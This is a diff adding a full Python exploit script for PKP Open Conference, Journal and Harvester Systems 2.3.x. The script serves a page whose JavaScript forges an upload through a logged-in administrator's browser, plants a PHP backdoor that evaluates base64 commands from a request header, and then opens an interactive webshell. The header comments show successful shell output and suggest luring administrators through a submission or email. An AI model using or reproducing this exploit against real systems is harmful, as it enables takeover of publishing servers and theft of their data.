@@ -1,0 +1,282 @@
+#!/usr/bin/python
+#
+# Open Conference/Journal/Harvester Systems <= 2.3.X multiple remote code execution vulnerabilities
+# vendor_________: Public Knowledge Project (pkp) -http://pkp.sfu.ca/
+# software link__: http://pkp.sfu.ca/download
+# author_________: mr_me::rwx kru
+# email__________: steventhomasseeley!gmail!com
+# tested on______: the interwebz & a LAMP stack using all 3 applications :)
+# 
+# Vulnerable applications by pkp:
+# - Open Conference Systems <= v2.3.4
+# - Open Journal Systems <= v2.3.6
+# - Open Harvester Systems <= v2.3.1
+#
+# Greetz to @kkotowicz, @malerisch and other busticati
+#
+# References:
+# -----------
+# http://blog.malerisch.net/2011/12/csrf-file-upload-poc.html
+# http://www.html5rocks.com/en/tutorials/file/xhr2/
+#
+# Description:
+# ------------
+# PKP has developed free, open source software for the management, publishing, and indexing of journals and conferences. 
+# Open Journal Systems and Open #Conference Systems increase access to knowledge, improve management, and reduce publishing costs. 
+# Open Harvester systems allows the creation of #centralized search services on metadata from Open Archives Initiative-compliant databases.
+# 
+# Vuln description:
+# -----------------
+# There is a few file upload vulnerabilities in the administrative interfaces of these applications that are 
+# unprotected and allow any peepz to CSRF it. I'm sick of vendors ignoring me on this kind of bug.
+#
+# Exploit requirement: 
+# --------------------
+# - Find the target conference/journal/archive: just visit http://[target]/[path]/index.php
+#   It will be a string value in a URI embeded in the page. Just use the first conference/journal/archive, and it will be id 1.
+# - You will need to embed the link into the application too and hope the admin gets curious..
+#   Maybe you could make a 'submission' to the conference, journal or archive entry or send a kind email ;)
+# ============================================================================================
+# mr_me@gliese:~/$ python ocs_csrf_rce.py -p localhost:8081 -t 192.168.220.134 -d ocs-2.3.4 -P 9090 -s seriousbiz
+#
+#		+==============================================================================================+
+#		| Open Conference/Journal/Harvester Systems <= 2.3.X csrf/upload/remote code execution exploit |
+#		| Found by: mr_me						 	  		       |
+#		+==============================================================================================+
+# (+) Testing proxy @ localhost:8081.. proxy is found to be working!
+# (+) Listening on local port 9090.
+# (+) Have someone connect to you at http://127.0.0.1:9090/
+#
+# Type <ctrl>-c to exit..
+#
+# localhost - - [23/Dec/2011 18:15:21] "GET / HTTP/1.1" 200 -
+#
+# (+) Exploit sent to the client target 127.0.0.1 attacking 192.168.220.134.
+# (-) Code injection and execution failed!
+# (-) Target client may not logged into the admin interface of Open Systems..!
+#
+# localhost - - [23/Dec/2011 18:15:39] "GET / HTTP/1.1" 200 -
+#
+# (+) Exploit sent to the client target 127.0.0.1 attacking 192.168.220.134.
+# (!) Code injection worked!
+# (!) Launching webshell..!
+#
+# opensys_shell@192.168.220.134# id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+#
+# opensys_shell@192.168.220.134# uname -a
+# Linux steve-web-server 2.6.35-31-generic #62-Ubuntu SMP Tue Nov 8 14:00:30 UTC 2011 i686 GNU/Linux
+#
+# opensys_shell@192.168.220.134# q
+#
+# (+) Back to listening..
+#
+# ^C(-) Exiting Exploit.
+#
+# .. have a merry christmas & happy new year !
+
+import sys
+import urllib
+import urllib2
+
+from optparse import OptionParser
+from BaseHTTPServer import HTTPServer 
+from BaseHTTPServer import BaseHTTPRequestHandler 
+from socket import gethostbyname, gethostname
+from time import sleep
+from base64 import b64encode
+ 
+usage = "./%prog [<options>] -t [target] -d [directory]"
+usage += "\nExample: ./%prog -p localhost:8080 -t 192.168.1.7 -d ocs-2.3.4 -P 80 -s seriousbiz"
+ 
+parser = OptionParser(usage=usage)
+parser.add_option("-p", type="string",action="store", dest="proxy",
+                  help="HTTP proxy <server:port>")
+parser.add_option("-t", type="string", action="store", dest="target",
+                  help="The target server <server:port>")
+parser.add_option("-d", type="string", action="store", dest="target_path",
+                  help="Directory path to the Open Conference/Journal/Harvester Systems")
+parser.add_option("-s", type="string", action="store", dest="conf_jour_arch",
+                  help="The target conference/journal/archive")
+parser.add_option("-P", type="int", action="store", dest="localport",
+                  help="The local port to have the target client connect back on")
+ 
+(options, args) = parser.parse_args()
+
+# some variables
+phpkode = "<?php error_reporting(0); eval(base64_decode($_SERVER[HTTP_HAX])); ?>" # change the code if you want
+app_entry_id = "1" # change to the right conference/journal/archive id (default = 1)
+app_type = "journals" # (conferences, journals or archives)
+
+def banner():
+    print ("\n\t| -------------------------------------------------------------------------------------------- |")
+    print ("\t| Open Conference/Journal/Harvester Systems <= 2.3.4 csrf/upload remote code execution exploit |")
+    print ("\t| found by mr_me ----------------------------------------------------------------------------- |\n")
+
+def test_proxy():
+	check = 1
+	sys.stdout.write("(+) Testing proxy @ %s.. " % (options.proxy))
+	sys.stdout.flush()
+	try:
+		req = urllib2.Request("http://www.google.com/")
+		req.set_proxy(options.proxy,"http")
+		check = urllib2.urlopen(req)
+	except:
+		check = 0
+		pass
+	if check != 0:
+		sys.stdout.write("proxy is found to be working!\n")
+		sys.stdout.flush()
+	else:
+		print ("proxy failed, exiting..")
+		sys.exit(1)
+
+def submit_request(exploit, header=None, data=None):
+	try:
+		if header != None:
+			headers = {}
+			headers['Hax'] = header
+		if data != None:
+			data = urllib.urlencode(data)
+		req = urllib2.Request("http://"+exploit, data, headers)
+		if options.proxy:
+			req.set_proxy(options.proxy,"http")
+		check = urllib2.urlopen(req).read()        
+	except urllib.error.HTTPError, error:
+		check = error.read()
+	except urllib.error.URLError:
+		print ("(-) Target connection failed, check your address")
+		sys.exit(1)
+	return check
+
+
+def check_request(req):
+	req = urllib2.Request("http://"+req)
+	if options.proxy:
+		req.set_proxy(options.proxy,"http")
+	return urllib2.urlopen(req).code
+		
+def check_shell():
+	full_request = options.target + "/" + options.target_path + "/files/" + app_type +"/" + app_entry_id + "/zeitgeist.php"
+	try:
+		check_request(full_request)
+		print ("(!) Code injection worked!")
+		return True
+	except:
+		print ("(-) Code injection and execution failed!")
+		print ("(-) Target client may not logged into the admin interface of Open Systems..!\n")		
+		return False
+	return True
+
+def drop_to_shell():
+	print ("(!) Launching webshell..!")
+	hn = "\nopensys_shell@%s# " % (options.target)
+        raw_cmd = ""
+        while raw_cmd != 'q':
+                raw_cmd = raw_input(hn)
+                base64_cmd = b64encode("system(\"%s\");" % raw_cmd)
+		try:
+			full_request = options.target + "/" + options.target_path + "/files/" + app_type + "/" + app_entry_id + "/zeitgeist.php"
+                	cmd_response = submit_request(full_request, base64_cmd, "")
+		except:
+			print ("(-) Code injection and execution failed!")
+			print ("(-) Target client may not logged into the admin interface of Open Systems..!\n")
+			break
+		print cmd_response.rstrip()
+	print ("(+) Back to listening..\n")
+
+class myRequestHandler(BaseHTTPRequestHandler):
+	def do_GET(self):
+		self.printCustomHTTPResponse(200)
+		if self.path == "/":
+			target=self.client_address[0]
+			self.response = """<html> 
+<body>
+<script>
+var target = 'http://[targethost]/[path]/index.php/[app]/index/manager/fileUpload/'; 
+function fileUpload(fileData, fileName) {
+	var fileSize = fileData.length,
+	boundary = "---------------------------270883142628617",
+	uri = target,
+	xhr = new XMLHttpRequest(),
+	fileFieldName = "file";
+	xhr.open("POST", uri, true);
+	xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary="+boundary);
+	xhr.setRequestHeader("Content-Length", fileSize);
+	xhr.withCredentials = "true";
+	var body = "";
+	body += addFileField(fileFieldName, fileData, fileName, boundary);
+	body += "--" + boundary + "--";
+	xhr.send(body);
+	return true;
+}
+function addFileField(name, value, filename, boundary) {
+	var c = "--" + boundary + "\\r\\n"
+	c += 'Content-Disposition: form-data; name="' + name + '"; filename="' + filename + '"\\r\\n';
+	c += "Content-Type: application/x-httpd-php\\r\\n\\r\\n";
+	c += value + "\\r\\n";
+	return c;	
+}
+function start() {
+	fileUpload("[phpkode]", "zeitgeist.php");
+}
+start();
+</script>
+</body>
+</html>"""
+
+			self.response = self.response.replace("[targethost]",options.target)
+			self.response = self.response.replace("[path]",options.target_path)
+			# slight variations..
+			if app_type == "journals":
+				self.response = self.response.replace("[app]/index",options.conf_jour_arch)
+			else:
+				self.response = self.response.replace("[app]",options.conf_jour_arch)
+			self.response = self.response.replace("[phpkode]",phpkode)
+			self.wfile.write(self.response)
+
+        		print ("\n(+) Exploit sent to the client target %s attacking %s." % (target,options.target))
+			sleep(2) # let the target get exploited, sheesh.
+			if check_shell():
+				drop_to_shell()
+			
+	def printCustomHTTPResponse(self, respcode):
+		self.send_response(respcode)
+		self.send_header("Content-type", "text/html")
+		self.send_header("Server", "myRequestHandler")
+		self.end_headers()
+
+def main():
+	# checks
+	if len(sys.argv) <= 8:
+		banner()
+		parser.print_help()
+		sys.exit(1)
+	elif not options.target_path or not options.conf_jour_arch or not options.target:
+		banner()
+		parser.print_help()
+		sys.exit(1)
+	if not options.localport:
+		port = 8080
+	else:
+		port = int(options.localport)
+	httpd = HTTPServer(('', port), myRequestHandler)
+	print (
+	"""\n\t\t+==============================================================================================+
+	\t| Open Conference/Journal/Harvester Systems <= 2.3.X csrf/upload/remote code execution exploit |
+	\t| Found by: mr_me						 	  		       |
+	\t+==============================================================================================+""")
+	if options.proxy:
+        	test_proxy()
+	print ("(+) Listening on local port %d." % port)
+	print ("(+) Have someone connect to you at http://%s:%s/" % (gethostbyname(gethostname()),port))
+	print ("\nType <ctrl>-c to exit..\n")
+	try:
+		httpd.handle_request()
+		httpd.serve_forever() 
+	except KeyboardInterrupt:
+		print ("(-) Exiting Exploit.")
+		sys.exit(1)
+
+if __name__ == "__main__":
+	main()
